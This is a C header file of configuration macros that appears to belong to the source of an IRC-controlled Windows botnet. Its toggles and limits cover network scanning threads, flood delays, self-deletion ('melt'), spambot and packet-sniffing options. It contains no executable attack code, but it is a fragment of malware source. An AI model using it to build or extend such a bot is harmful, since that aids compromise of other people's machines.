//#define _DEBUG
#define NO_GET_IP_HTTP
#define NO_OPENSSL
#define NO_VISIT
#define NO_SPAMBOT
#define NO_MODEONJOIN

#ifdef _DEBUG//leave me alone
#define NO_MELT
#define NO_SERVICE
#endif

#ifdef NO_ADVSCAN//leave me alone
#define NO_ASN
#endif

#define NO_SPAMBOT

#define PING_TIMEOUT	3600	// If the bot hasnt recieved anything in this amount
								// of time it will quit and reconnect (s)
//#define IRCLINE         1024
#define IRCLINE			514

#define MAX_TOKENS		64
#define MAX_LOGINS		1
#define MAX_THREADS		500

#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		18
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22

#define MAX_SCANDELAY	60
#define MIN_SCANDELAY	3

#define MAX_SCANTHRD	256
#define MAX_SCANTIME	9999

#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383

#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX

#define FLOOD_DELAY		2000	// Send flood delay (ms)
#define SFLOOD_DELAY	7000	// Reconnect flood delay (ms)
#define RUPTIME_DELAY	600000	// Record uptime check delay (ms)
#define SECURE_DELAY	600000	// Secure thread loop delay (ms)

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#ifndef SIO_RCVALL
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)
#endif
